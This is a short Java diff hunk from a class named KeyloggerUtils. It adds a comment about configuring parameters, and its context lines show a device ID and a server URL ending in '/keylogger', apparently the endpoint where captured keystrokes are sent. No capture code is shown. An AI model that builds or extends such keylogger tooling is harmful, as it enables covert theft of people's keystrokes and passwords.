@@ -25,6 +25,9 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class KeyloggerUtils {
+    /**
+     * Configure these parameters according to server configuration.
+     */
     private static final Integer DEVICE_ID = 1;
     private static final String SERVER_URL = "http://10.0.0.13:3000/keylogger";
 
